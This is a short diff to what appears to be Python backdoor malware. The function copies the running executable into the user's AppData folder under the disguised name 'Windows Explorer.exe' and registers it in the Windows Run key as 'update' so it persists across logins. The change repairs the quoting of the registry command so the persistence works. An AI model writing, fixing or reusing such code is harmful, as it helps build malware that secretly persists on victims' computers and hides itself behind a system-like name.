@@ -29,7 +29,7 @@ def execute_on_startup():
             backdoor_loc = os.environ["appdata"] + "\\Windows Explorer.exe"
             if(not os.path.exists(backdoor_loc)):
                 shutil.copyfile(sys.executable, backdoor_loc)
-                sys_command = "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d '" + backdoor_loc + "'"
+                sys_command = 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + backdoor_loc + '"'
                 result = execute_system_command(sys_command)
     
     except:
